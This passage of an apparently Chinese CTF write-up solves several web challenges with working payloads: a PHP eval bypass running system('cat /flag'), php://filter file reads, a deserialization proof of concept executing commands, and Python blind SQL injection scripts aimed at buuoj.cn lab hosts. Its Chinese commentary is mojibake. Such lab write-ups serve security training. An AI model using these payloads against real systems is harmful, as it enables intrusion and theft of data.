class="variable">$var</span>))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 5&quot;</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â file_get_contents(<span class="string">&quot;/flag&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 5&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br><span class="line">http:<span class="comment">//e9f2544c-4f0e-400c-b5d2-0aa335160abb.node4.buuoj.cn:81/?key1=QNKCDZO&amp;key2=240610708&amp;key4[]=1&amp;key5=2222c</span></span><br><span class="line">post:key3[]=<span class="number">1</span>&amp;flag5=%CE</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WEEK1-WEB-R-C-E"><a href="#WEEK1-WEB-R-C-E" class="headerlink" title="WEEK1|WEB R!C!E!"></a>WEEK1|WEB R!C!E!</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;Â Â Â Â <span class="variable">$password</span>=md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);Â Â Â Â <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(substr(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">eval</span>(<span class="variable">$code</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªå°å¯†ç ï¼Œç”¨pythonçˆ†ç ´ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">Â  Â  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">Â  Â  Â  Â  t1 = Â <span class="built_in">str</span>(i)</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#t1 = Â &#x27;XIPU&#x27; Â str(i)+</span></span><br><span class="line">Â  Â  Â  Â  md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#print(md5_result)</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> md5_result[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;c4d038&#x27;</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># j = md5_result[10:24]</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment">#isdigit()åˆ¤æ–­æ˜¯å¦ä¸ºçº¯æ•°å­—ï¼Œæ˜¯åˆ™ä¸ºtrue åä¹‹false</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># if j.isdigit():</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line">mohu_md5()</span><br><span class="line"></span><br><span class="line"><span class="comment">#114514-----&gt;c4d038b4bed09fdb1471ef51ec3a32cd</span></span><br></pre></td></tr></table></figure><p>$_POST[â€˜e_v.a.lâ€™]))è¿™ä¸ªevalä¼ å‚çš„æ—¶å€™ï¼Œè¦æŠŠ<code>_</code>æ¢æˆ<code>[</code>,<br>post:<br><code>password=114514&amp;e[v.a.l=eval($_POST[&#39;a&#39;]);&amp;a=system(&#39;cat /flag&#39;);</code></p><h5 id="WEEK1-WEB-EasyLogin"><a href="#WEEK1-WEB-EasyLogin" class="headerlink" title="WEEK1|WEB EasyLogin"></a>WEEK1|WEB EasyLogin</h5><p>adminçˆ†ç ´å³å¯ï¼ŒåŠ ä¸€ä¸‹md5<br><img src="/images/xinshengsai/20231011160139.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ"><a href="#WEEK2-WEB-å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ" class="headerlink" title="WEEK2|WEB å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ"></a>WEEK2|WEB å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ</h5><p>çœ‹ä¸€ä¸‹æºç ï¼Œå¤§äº100000000å³å¯ï¼Œjsonä¼ å‚</p><p><img src="/images/xinshengsai/20231009210734.png" alt="image-20220126203415648"><img src="/images/xinshengsai/20231009210939.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-include-0ã€‚0"><a href="#WEEK2-WEB-include-0ã€‚0" class="headerlink" title="WEEK2|WEB include 0ã€‚0"></a>WEEK2|WEB include 0ã€‚0</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   highlight_file(<span class="keyword">__FILE__</span>);   <span class="comment">//Â FLAGÂ inÂ theÂ flag.php   </span></span><br><span class="line"><span class="variable">$fileÂ </span>=Â <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>)Â &amp;&amp;Â !preg_match(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;   Â Â Â Â @<span class="keyword">include</span>(<span class="variable">$file</span>);   &#125;<span class="keyword">else</span>&#123;   Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);   &#125;   <span class="meta">?&gt;</span></span><br><span class="line">nope</span><br></pre></td></tr></table></figure><p>ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿‡æ»¤äº†base  rotï¼Œå¯ä»¥ç”¨å…¶ä»–åè®®<br><a href="http://a9e88e4f-6a32-485c-a733-fd09df8be832.node4.buuoj.cn:81/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php">http://a9e88e4f-6a32-485c-a733-fd09df8be832.node4.buuoj.cn:81/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</a><br>å¾—åˆ°çš„ä¸œè¥¿å†è½¬å›å»å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&lt;hp p//lfga4&#123;2eb4dc-ece724-61-56a454-2c408bdd68&#125;a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&#x27;UCS-2BE&#x27;</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><h5 id="WEEK2-WEB-Unserializeï¼Ÿ"><a href="#WEEK2-WEB-Unserializeï¼Ÿ" class="headerlink" title="WEEK2|WEB Unserializeï¼Ÿ"></a>WEEK2|WEB Unserializeï¼Ÿ</h5><p>ååºåˆ—åŒ–ï¼Œprivateå˜é‡è¢«åºåˆ—åŒ–æ—¶ä¼šäº§ç”Ÿ\x00ï¼Œè¦æ³¨æ„urlç¼–ç <br>è¿‡æ»¤äº†å¸¸ç”¨æŸ¥çœ‹å‘½ä»¤ç”¨nl</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="comment">//Â MaybeÂ youÂ needÂ learnÂ someÂ knowledgeÂ aboutÂ deserialize?  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">evil</span>Â </span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">private</span>Â <span class="variable">$cmd</span>;  </span><br><span class="line">  </span><br><span class="line">Â Â Â Â <span class="keyword">public</span>Â <span class="function"><span class="keyword">function</span>Â <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>,Â <span class="keyword">$this</span>-&gt;cmd))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â @system(<span class="keyword">$this</span>-&gt;cmd);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Â  Â  </span>&#123;</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  @system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> evil();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$s</span>));</span><br></pre></td></tr></table></figure><h5 id="WEEK2-WEB-ez-sql"><a href="#WEEK2-WEB-ez-sql" class="headerlink" title="WEEK2|WEB ez_sql"></a>WEEK2|WEB ez_sql</h5><p>sqlæ³¨å…¥ï¼Œç›²æ³¨<br>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sql_char = [<span class="string">&#x27;select&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;union&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;and&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;or&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;sleep&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;where&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;from&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;limit&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;group&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;by&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;like&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;prepare&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;as&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;if&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;char&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;ascii&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;mid&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;left&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;right&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;substring&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;handler&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;updatexml&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;extractvalue&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;benchmark&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;insert&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;update&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;\&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;--&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;=&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27; &#x27;</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> sql_char:</span><br><span class="line"></span><br><span class="line">Â  Â  res = requests.get(<span class="string">&quot;http://1f2edf21-fa95-4d74-8410-ad4faffbfb07.node4.buuoj.cn:81/?id=TMP0929&quot;</span>+char)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> <span class="string">&#x27;no!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(char))</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;é€šè¿‡: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(char))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥æ‰€éœ€æ¨¡å—</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ å­—æ¯è¡¨ï¼Œæ ¹æ®å­—æ¯è¡¨å»çˆ†ç ´æ¯ä¸€ä½çš„å…·ä½“å€¼</span></span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;-,&#125;&#123;_=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alphabet)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢˜ç›®çš„URL</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8c704eaf-a795-49b7-9951-a7b2f4811142.node4.buuoj.cn:81/?id=TMP0929&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨å…¥ä»€ä¹ˆæ•°æ®ï¼Œselectå˜é‡å°±å†™ä»€ä¹ˆå­æŸ¥è¯¢è¯­å¥</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span> <span class="comment">#è·å–æ‰€æœ‰åº“å</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;&quot;</span> <span class="comment">#è·å–è¡¨å</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctf&#x27; and table_name=&#x27;here_is_flag&#x27;&quot;</span><span class="comment">#è·å–å­—æ®µå</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select flag from ctf.here_is_flag&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æ¥ä¿å­˜æ³¨å…¥å‡ºçš„ç»“æœ</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># å¤–å±‚å¾ªç¯ï¼Œä»1å¼€å§‹ï¼Œå› ä¸ºæˆªå–çš„ä½æ•°æ˜¯ä»1å¼€å§‹çš„</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># å†…å±‚å¾ªç¯ï¼Œæ˜¯å…·ä½“éœ€è¦æµ‹è¯•çš„å€¼</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># æ„é€ SQLè¯­å¥ï¼Œå‘èµ·è¯·æ±‚</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment">#payload = f&quot;&#x27; AND subStr((selEct database()) ,&#123;i&#125;,1) = &#x27;&#123;ch&#125;&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  payload = <span class="string">f&quot;&#x27; AND subStr((SELECT flag FROM here_is_flag) ,<span class="subst">&#123;i&#125;</span>,1) = &#x27;<span class="subst">&#123;ch&#125;</span>&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  r = requests.get(url=url+payload)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># æ ¹æ®å›æ˜¾åˆ¤æ–­ï¼Œå¦‚æœå¾—åˆ°äº†è¡¨ç¤ºæŸ¥è¯¢æˆåŠŸçš„å›æ˜¾ï¼Œé‚£ä¹ˆè¯´æ˜åˆ¤æ–­æ•°æ®çš„è¿™ä¸€ä½æ˜¯æ­£ç¡®çš„</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">ord</span>(ch) &lt; <span class="number">66</span> :  <span class="comment">#buuæœ‰429  sleepä¸€ä¸‹</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="string">&quot;class_name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  result += ch</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;æ³¨å…¥æˆåŠŸï¼š&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(url+payload)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span> <span class="comment"># 